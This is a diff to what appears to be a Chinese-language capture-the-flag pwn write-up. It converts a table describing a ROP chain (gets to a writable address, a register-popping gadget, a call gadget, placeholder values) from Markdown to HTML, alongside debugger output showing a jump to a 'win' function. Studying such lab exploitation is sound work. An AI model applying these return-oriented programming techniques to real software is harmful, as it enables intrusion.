@@ -387,17 +387,46 @@ hit breakpoint at: 0x400576
 0x00601040  0x0000000000000000  0x0000000000000000   ................
 </code></pre><p>RW_LOC = 0x00601040</p>
 <ul>
-<li>rop链
-|rop偏移|rop内容|
-| :===: | :===: |
-| + 00 | gets(RW_LOC) |
-| + x1 | 0x0040068c == (pop r12; pop r13; pop r14; pop r15;ret) |
-| + x2 | RW_LOC |
-| + x3 |  0xdeadbeefcafed00d |
-| + x4 | 0 |
-| + x5 | 0 |
-| + x6 | 0x00400666 == (&hellip;,mov rdx,r13; mov rsi,r14; mov rdi, r15d; call qword [r12 + rbx*8]) |</li>
+<li>rop链</li>
 </ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">rop偏移</th>
+<th style="text-align:center">rop内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">+ 00</td>
+<td style="text-align:center">gets(RW_LOC)</td>
+</tr>
+<tr>
+<td style="text-align:center">+ x1</td>
+<td style="text-align:center">0x0040068c == (pop r12; pop r13; pop r14; pop r15;ret)</td>
+</tr>
+<tr>
+<td style="text-align:center">+ x2</td>
+<td style="text-align:center">RW_LOC</td>
+</tr>
+<tr>
+<td style="text-align:center">+ x3</td>
+<td style="text-align:center">0xdeadbeefcafed00d</td>
+</tr>
+<tr>
+<td style="text-align:center">+ x4</td>
+<td style="text-align:center">0</td>
+</tr>
+<tr>
+<td style="text-align:center">+ x5</td>
+<td style="text-align:center">0</td>
+</tr>
+<tr>
+<td style="text-align:center">+ x6</td>
+<td style="text-align:center">0x00400666 == (&hellip;,mov rdx,r13; mov rsi,r14; mov rdi, r15d; call qword [r12 + rbx*8])</td>
+</tr>
+</tbody>
+</table>
 <h2 id="pwn">pwn</h2>
 <pre tabindex="0"><code>$rax   : 0x0000000000601040  →  0x00000000004005b6  →  &lt;win+0&gt; push rbp
 $rbx   : 0x0               
